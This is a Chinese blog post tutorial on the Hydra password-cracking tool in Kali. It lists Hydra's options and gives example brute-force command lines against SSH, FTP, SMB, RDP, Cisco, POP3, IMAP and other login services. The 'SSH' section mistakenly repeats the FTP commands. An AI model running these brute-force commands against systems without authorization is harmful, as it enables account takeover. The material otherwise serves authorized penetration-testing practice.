--- 
layout: post
title: "KALI Hydra破解工具的使用"
date: 2017-11-27 10:13:06 
description: "KALI Hydra破解工具的使用"
tag: Tools
---

### 介绍

&nbsp;&nbsp;&nbsp;&nbsp;hydra是一种猜测和破解密码的工具，支持多种网络协议，如HTTP、FTP、POP3、SMB等。Hydra依靠提供的用户名和秘密，并尝试登陆网络服务器，默认行数为16.一旦登陆成功，将会保存相关的记录。

`说明：使用的情况是远程非本地`

### 安装

`windows:`
链接：http://pan.baidu.com/s/1ge7NdoZ 密码：atob

`Linux:`

 `su apt-get install hydra 
 或者 su yum install –y hydra`

如果你使用的的源码编译安装，也许你需要安装一些可选的模块：
`libssl-dev libssh-dev libidn11-dev libpcre3-dev 
libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird2.1-dev libncp-dev`

### 使用帮助文档

[官方使用帮助文档](https://www.thc.org/thc-hydra/README)

### 基本参数

```C
1.	常用参数：
2.	
3.	-l: 指定登陆名
4.	-L: 指定登陆名的文件
5.	-p: 指定破解的密码
6.	-P：指定破解密码的文件
7.	-e ns: 尝试密码为空和账号是密码的情况
8.	-t: 指定线程
9.	-f: 指定当找到第一个破解出来的密码后停止
10.	-C： 是-P、-L的替代，指定存放用户名和密码的文件，格式是  用户名:密码
11.	-M: 指定破解的主机和端口的文件 ,格式是  主机或者IP:端口  
12.	    或者  不带端口使用默认端口格式  主机或者域名
13.	-v: 显示详细过程
14.	-w: 设置最大超时时间

基本使用方法：
hydra -l  用户名 -P 字典文件 IP 协议
hydra -L 用户名文件 -P 密码文件 IP 协议
```

### 破解SSH

```C
# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```

### 破解FTP

```C
# hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
# hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```

### 破解CISCO

```C
# hydra -P pass.txt 10.36.16.18 cisco
# hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
```

### 破解TEAMSPEAK

```C
# hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
```

### 破解SMB

```C
# hydra -l administrator -P pass.txt 10.36.16.18 smb
```

### 破解POP3

```C
# hydra -l muts -P pass.txt my.pop3.mail pop3
```

### 破解RDP

```C
# hydra ip rdp -l administrator -P pass.txt -V
```

### 破解http-proxy

```C
# hydra -l admin -P pass.txt http-proxy://10.36.16.18
```

### 破解IMAP

```C
# hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
```

### 其他协议的破解

> 请使用hydra –U PROTOCOL 来查看使用的例子,比如想查看http-post-form破解：
hydra –U http-post-hydra

> PROTOCOLS(支持的协议类型):
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,
HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY,
HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST,
HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener,
Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin,
Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5,
SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth,
VNC and XMPP.


推荐阅读：

- [Tkinter Button控件使用-2](https://ssjt21.github.io/2017/11/Python_TK_Button/)

- [Tkinter Canvas控件使用-3](https://ssjt21.github.io/2017/11/Python_TK_Canvas/)

- [Python PIL Image类使用](http://ssjt21.github.io/2017/11/Python_PIL_Image_Module/)

- [Python调用Hashcat跑主机密码文件](http://ssjt21.github.io/2017/11/Python_Hashcatshell/)



<br>

转载请注明：[随时静听的博客](http://ssjt21.github.io) » [点击阅读原文](https://ssjt21.github.io/2017/11/TOOLS_Hydra/)